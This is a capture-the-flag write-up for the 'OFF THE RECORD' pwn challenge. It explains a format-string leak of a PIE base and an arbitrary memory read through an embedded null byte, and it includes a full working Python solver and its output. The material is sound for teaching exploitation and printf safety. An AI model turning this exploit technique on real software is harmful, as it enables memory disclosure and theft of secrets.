---
title: "OFF THE RECORD - Pwn Challenge Writeup"
date: "2026-06-27"
category: "Pwn"
status: "Read writeup"
href: "/blog/off-the-record"
image: "/images/off-the-record.svg"
imageAlt: "OFF THE RECORD pwn challenge"
excerpt: "Cyber Arena 2026 - Pwn - Format string exploitation against a PIE binary: leak main, recover the PIE base, then read the hidden flag buffer with a controlled %s dereference."
---


## Challenge Information

|Field|Value|
|---|---|
|Challenge|OFF THE RECORD|
|Category|Pwn|
|Points|100|
|Author|Cyrus|
|Flag|`MPTC{th3_1nt3rn_15_n0t_g3tt1ng_4_r41s3}`|
|AI assistance|Used to help organize notes, validate reasoning, and refine the final writeup.|

> A newsroom tip line made by one intern at 3 a.m. It is held together with tape. The spicy reports go into a drawer marked do not publish. The intern said it was locked. The intern is optimistic. :P
> 
> File a tip. >:)

---

## 1. Summary

The `tip` command has a format-string bug. Input is copied into a stack buffer and then passed directly to `printf()`:

```c
printf("  [PRINTED]: ");
printf(print_buffer);
```

Because the program is PIE, the hidden flag buffer address changes every run. The exploit has two steps:

1. Leak the runtime address of `main` using `%115$p`.
2. Compute the PIE base and read the flag buffer using `%42$s`.

This attack does not need shellcode, ROP, libc leak, or control-flow hijack.

---

## 2. Initial Analysis

The archive contains:

```text
off_the_record
Dockerfile
```

`file off_the_record` shows:

```text
off_the_record: ELF 64-bit LSB pie executable, x86-64,
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
for GNU/Linux 3.2.0, stripped
```

The binary is a stripped 64-bit Linux executable.

### Security mitigations

|Mitigation|Status|
|---|---|
|Full RELRO|Enabled|
|Stack Canary|Enabled|
|NX|Enabled|
|PIE|Enabled|
|Stripped|Yes|

Relevant ELF flags:

```text
GNU_STACK      RW
GNU_RELRO      R
FLAGS          BIND_NOW
FLAGS_1        NOW PIE
```

These defenses block many attacks, but the format string still allows memory reads.

---

## 3. Program Functionality

The program supports:

```text
tip <text>         file a tip with the desk
store <id> <text>  file a tip into slot <id>
read <id>          read back slot <id>
unredact           declassify the held memo
publish            publish the held memo
help               display help
quit               exit
```

The `publish` command looks important, but static analysis shows it is a decoy.

---

## 4. Static Analysis

### Finding `main`

The entry point passes the function at offset `0x11c0` to `__libc_start_main`:

```asm
0x16f8: lea rdi, [rip-0x53f]       ; 0x11c0
0x16ff: call [__libc_start_main]
```

So:

```text
main offset = 0x11c0
```

### Finding the hidden flag buffer

At startup, the program opens `flag.txt`:

```asm
0x1219: lea rdi, [rip+...]          ; "flag.txt"
0x1220: call fopen
```

It then reads up to `0x80` bytes into a global buffer:

```asm
0x122e: lea rbx, [rip+0x30ab]       ; 0x42e0
0x1238: mov esi, 0x80
0x1240: mov rdi, rbx
0x1243: call fgets
```

Equivalent code:

```c
FILE *fp = fopen("flag.txt", "r");
fgets(flag_buffer, 0x80, fp);
```

The flag buffer is at PIE offset `0x42e0`, so at runtime:

```python
flag_address = pie_base + 0x42e0
```

---

## 5. The Format-String Vulnerability

The command buffer is near `rsp + 0x110`, and the print buffer is near `rsp + 0x10`.

For `tip`, the program behaves like:

```c
strncpy(print_buffer, command_buffer + 4, 0xff);
print_buffer[0xff] = '\0';
printf("  [PRINTED]: ");
printf(print_buffer);
puts("");
```

The second `printf()` is unsafe because user input is used as the format string.

A safe version would be:

```c
printf("%s", print_buffer);
```

---

## 6. The `publish` False Lead

The `publish` command checks a global integer at PIE offset `0x4240`:

```asm
0x1600: mov eax, DWORD PTR [rip+...]     ; PIE + 0x4240
0x1606: test eax, eax
0x1608: je no_credentials
```

A `%n` write can bypass that check, but `publish` only shows an internal draft, not the flag.

The real flag is still in the buffer at `PIE + 0x42e0`.

---

## 7. Stage One: Leak PIE

Because PIE is enabled, the flag buffer address changes each run.

`tip %115$p` leaks `main`:

```text
tip %115$p
```

Then:

```python
main_address = 0x5c3fd05e21c0
pie_base = main_address - 0x11c0
flag_address = pie_base + 0x42e0
```

This gives the runtime flag address.

---

## 8. Stage Two: Construct an Arbitrary Read

The `%s` conversion takes its argument as a pointer and prints the string there.

A qword stored at command offset 16 becomes argument 42.

The final specifier is:

```text
%42$s
```

---

## 9. Embedded Null-Byte Technique

The payload uses an embedded null byte:

```text
tip %42$s\x00AAAAAA<flag address>\n
```

This works because:

1. `fgets()` reads the whole input, including bytes after the null.
2. C string handling ends the format string at the null.
3. `strncpy()` copies only `%42$s` into the vulnerable buffer.
4. The address remains later in the original command buffer.
5. `%42$s` then reads the flag from that address.

Payload layout:

|Offset|Data|Purpose|
|--:|---|---|
|`0x00`|`tip`|Choose the vulnerable command|
|`0x04`|`%42$s`|Read argument 42|
|`0x09`|`\x00`|End the format string|
|`0x0a`|`AAAAAA`|Padding|
|`0x10`|`p64(flag_address)`|Flag address|
|`0x18`|`\n`|Finish input|

Constructed as:

```python
fmt = b"%42$s"
prefix = b"tip " + fmt + b"\x00"
payload = prefix.ljust(16, b"A")
payload += p64(flag_address)
payload += b"\n"
```

---

## 10. Exploit Logic

The full exploit is:

```python
send(b"tip %115$p\n")
main_address = parse_pointer(response)
pie_base = main_address - 0x11c0
flag_address = pie_base + 0x42e0
payload = b"tip %42$s\x00"
payload = payload.ljust(16, b"A")
payload += p64(flag_address)
payload += b"\n"
send(payload)
```

---

---

## 11. Solver

```python
#!/usr/bin/env python3
"""Exploit for OFF THE RECORD.

Usage:
  Local:  python3 solve_off_the_record.py /path/to/off_the_record
  Remote: python3 solve_off_the_record.py HOST PORT
"""

from __future__ import annotations

import os
import re
import socket
import struct
import subprocess
import sys
from pathlib import Path
from typing import BinaryIO

PROMPT = b"  [anonymous]> "
MAIN_OFFSET = 0x11C0
FLAG_BUFFER_OFFSET = 0x42E0
LEAK_POSITION = 115
STAGED_POINTER_POSITION = 42
STAGED_POINTER_OFFSET = 16


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


class Tube:
    def send(self, data: bytes) -> None:
        raise NotImplementedError

    def recv(self, size: int = 4096) -> bytes:
        raise NotImplementedError

    def recvuntil(self, marker: bytes) -> bytes:
        data = bytearray()
        while marker not in data:
            chunk = self.recv(1)
            if not chunk:
                raise EOFError(f"connection closed before {marker!r}; received {bytes(data)!r}")
            data.extend(chunk)
        return bytes(data)

    def close(self) -> None:
        pass


class RemoteTube(Tube):
    def __init__(self, host: str, port: int) -> None:
        self.sock = socket.create_connection((host, port), timeout=10)
        self.sock.settimeout(10)

    def send(self, data: bytes) -> None:
        self.sock.sendall(data)

    def recv(self, size: int = 4096) -> bytes:
        return self.sock.recv(size)

    def close(self) -> None:
        self.sock.close()


class ProcessTube(Tube):
    def __init__(self, binary: str) -> None:
        binary_path = Path(binary).resolve()
        if not binary_path.is_file():
            raise FileNotFoundError(binary_path)
        self.proc = subprocess.Popen(
            [str(binary_path)],
            cwd=str(binary_path.parent),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=0,
        )
        assert self.proc.stdin is not None
        assert self.proc.stdout is not None
        self.stdin: BinaryIO = self.proc.stdin
        self.stdout: BinaryIO = self.proc.stdout

    def send(self, data: bytes) -> None:
        self.stdin.write(data)
        self.stdin.flush()

    def recv(self, size: int = 4096) -> bytes:
        return self.stdout.read(size)

    def close(self) -> None:
        if self.proc.poll() is None:
            self.proc.terminate()
        self.proc.wait(timeout=2)


def build_flag_read_payload(flag_address: int) -> bytes:
    # The copied format string is only "%42$s". The embedded NUL stops
    # strncpy/printf from parsing the staged pointer bytes as format text.
    fmt = f"%{STAGED_POINTER_POSITION}$s".encode()
    prefix = b"tip " + fmt + b"\x00"

    if len(prefix) > STAGED_POINTER_OFFSET:
        raise ValueError("format prefix is too large for the chosen stack slot")

    payload = prefix.ljust(STAGED_POINTER_OFFSET, b"A")
    payload += p64(flag_address)
    payload += b"\n"

    assert payload.index(p64(flag_address)) == STAGED_POINTER_OFFSET
    return payload


def exploit(io: Tube) -> bytes:
    banner = io.recvuntil(PROMPT)
    sys.stdout.buffer.write(banner)
    sys.stdout.buffer.flush()

    # A stable stack slot contains main's PIE address.
    io.send(f"tip %{LEAK_POSITION}$p\n".encode())
    leak_response = io.recvuntil(PROMPT)
    sys.stdout.buffer.write(leak_response)
    sys.stdout.buffer.flush()

    match = re.search(rb"0x[0-9a-fA-F]+", leak_response)
    if not match:
        raise RuntimeError("failed to locate PIE leak in service response")

    main_address = int(match.group(0), 16)
    pie_base = main_address - MAIN_OFFSET
    flag_address = pie_base + FLAG_BUFFER_OFFSET

    print(f"[+] main leak : {main_address:#x}")
    print(f"[+] PIE base  : {pie_base:#x}")
    print(f"[+] flag buf  : {flag_address:#x}")

    io.send(build_flag_read_payload(flag_address))
    flag_response = io.recvuntil(PROMPT)
    sys.stdout.buffer.write(flag_response)
    sys.stdout.buffer.flush()

    flag_match = re.search(rb"[A-Za-z0-9_]{2,20}\{[^}\r\n]+\}", flag_response)
    if not flag_match:
        raise RuntimeError("format-string read worked, but no flag-shaped value was found")

    return flag_match.group(0)


def main() -> int:
    if len(sys.argv) == 2:
        io: Tube = ProcessTube(sys.argv[1])
    elif len(sys.argv) == 3:
        io = RemoteTube(sys.argv[1], int(sys.argv[2]))
    else:
        print(__doc__.strip(), file=sys.stderr)
        return 2

    try:
        flag = exploit(io)
        print(f"[+] FLAG: {flag.decode(errors='replace')}")
        return 0
    finally:
        io.close()


if __name__ == "__main__":
    raise SystemExit(main())

```


### Remote execution

```bash
python3 solve_off_the_record.py HOST PORT
```

Successful remote output:

![off-the-road](../../../Public/images/off-the-road.png)

```text
[PRINTED]: 0x5c3fd05e21c0

[+] main leak : 0x5c3fd05e21c0
[+] PIE base  : 0x5c3fd05e1000
[+] flag buf  : 0x5c3fd05e52e0

[PRINTED]: MPTC{th3_1nt3rn_15_n0t_g3tt1ng_4_r41s3}

[+] FLAG: MPTC{th3_1nt3rn_15_n0t_g3tt1ng_4_r41s3}
```
